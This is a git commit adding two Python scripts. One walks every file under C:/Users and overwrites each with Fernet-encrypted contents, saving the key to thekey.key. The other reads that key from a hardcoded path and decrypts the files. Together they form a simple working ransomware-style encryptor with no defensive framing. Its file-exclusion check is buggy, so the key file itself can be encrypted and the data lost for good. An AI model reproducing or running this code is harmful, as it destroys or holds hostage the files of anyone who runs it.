f2d9ecea138d530136f0c4618f1f1d00834e0ef7
JLDreal <106476341+JLDreal@users.noreply.github.com>
2022-05-29 14:52:45 +0200

    Add files via upload

---
+++ TEST.py
@@ -0,0 +1,26 @@
+import os
+import scandir
+from cryptography.fernet import Fernet
+folder = "C:/Users"
+
+file_list = []
+
+for paths, dirs, files in scandir.walk(folder):
+#for (paths, dirs, files) in os.walk(folder):
+    for file in files:
+        if file.endswith("TEST.py" or "TEST2.py"or "thekey.key"):
+            continue
+        else:
+            file_list.append(os.path.join(paths, file))
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
+
+for file in file_list:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
---
+++ TEST2.py
@@ -0,0 +1,26 @@
+import os
+import scandir
+from cryptography.fernet import Fernet
+folder = "C:/Users"
+
+file_list = []
+
+for paths, dirs, files in scandir.walk(folder):
+#for (paths, dirs, files) in os.walk(folder):
+    for file in files:
+        if file.endswith("TEST.py" or "TEST2.py" or "thekey.key"):
+            continue
+        else:
+            file_list.append(os.path.join(paths, file))
+
+
+
+with open("C:/Users/jaksc/Downloads/gameduck/thekey.key", "rb") as thekey:
+    secretkey = thekey.read()
+
+for file in file_list:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_decrypted = Fernet(secretkey).decrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_decrypted)
